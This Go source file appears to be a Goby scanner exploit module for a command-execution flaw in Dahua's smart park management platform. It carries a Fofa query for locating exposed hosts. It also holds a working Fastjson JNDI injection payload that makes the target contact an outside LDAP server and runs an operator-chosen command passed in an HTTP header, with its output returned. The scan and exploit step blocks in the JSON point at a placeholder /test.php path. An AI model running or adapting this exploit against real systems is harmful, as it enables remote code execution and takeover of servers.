package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS deleteFtp Api Command Execution Vulnerability",
    "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies, the digital upgrade of park management can be realized to improve security levels, work efficiency, and management. Cost reduction.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2022-03-23",
    "Author": "1171373465@qq.com",
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "Level": "3",
    "Impact": "<p>Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"http://dahuatech.corp.dav01.com\">http://dahuatech.corp.dav01.com</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "ldap",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "ldapAddr",
            "type": "input",
            "value": "",
            "show": "attackType=ldap"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Information technology application innovation industry"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 deleteFtp 接口远程命令执行漏洞",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华智慧园区解决方案围绕运营管理、综合安防、便捷通行、协同办公等多个业务领域展开，依托AI、物联网、大数据技术实现园区管理数字化升级，实现安全等级提升、工作效率提升、管理成本下降。<br></p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://dahuatech.corp.dav01.com\">http://dahuatech.corp.dav01.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "信创"
            ]
        },
        "EN": {
            "Name": "Dahua DSS deleteFtp Api Command Execution Vulnerability",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies, the digital upgrade of park management can be realized to improve security levels, work efficiency, and management. Cost reduction.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"http://dahuatech.corp.dav01.com\" target=\"_blank\">http://dahuatech.corp.dav01.com</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>Through this vulnerability, the attacker can arbitrarily execute the code on the server side, write the back door, obtain the server permission, and then control the whole Web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "Information technology application innovation industry"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-22",
    "PocId": "10837"
}`
	sendPayloadFlag1VVT := func(hostInfo *httpclient.FixUrl, ldapAddr, cmd string) (*httpclient.HttpResponse, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/CardSolution/card/accessControl/swingCardRecord/deleteFtp")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "application/json")
		if cmd != "" {
			postRequestConfig.Header.Store("cmd", cmd)
		}
		postRequestConfig.Data = fmt.Sprintf(`{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"%s","autoCommit":true}}}`, ldapAddr)
		return httpclient.DoHttpRequest(hostInfo, postRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			ldapAddr, _ := godclient.GetGodLDAPCheckURL("U", checkStr)
			sendPayloadFlag1VVT(hostInfo, ldapAddr, "")
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := ""
			ldapAddr := ""
			if attackType == "cmd" {
				// TODO ldap 回显必须要通过序列话字节的方式完成，参考：https://github.com/Jeromeyoung/JNDIExploit-1/blob/master/src/main/java/com/feihong/ldap/controllers/SerializedDataController.java
				ldapAddr = "ldap://" + godclient.GetGodServerHost() + "/A4"
				cmd = goutils.B2S(ss.Params["cmd"])
			} else if attackType == "ldap" {
				cmd = ""
				ldapAddr = goutils.B2S(ss.Params["ldapAddr"])
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			rsp, err := sendPayloadFlag1VVT(expResult.HostInfo, ldapAddr, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				output := ""
				if attackType == "cmd" {
					expResult.Success = true
					output = rsp.Utf8Html
				} else {
					expResult.Success = true
					output = "请查收 LDAP 请求日志"
				}
				expResult.Output = output
			}
			return expResult
		},
	))
}
